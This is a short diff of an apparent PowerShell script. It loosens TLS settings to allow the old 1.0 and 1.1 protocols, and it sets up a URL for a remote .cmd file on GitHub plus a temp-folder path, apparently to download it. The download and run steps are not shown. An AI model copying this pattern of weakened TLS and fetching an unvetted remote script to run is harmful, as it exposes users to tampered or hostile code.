@@ -1,4 +1,4 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]'Tls,Tls11,Tls12'
 
 $cmdUrl = "https://github.com/nizhenets/Special_script/raw/main/scripts/key_and_log/test.cmd"
 $tempPath = "$env:TEMP\test.cmd"
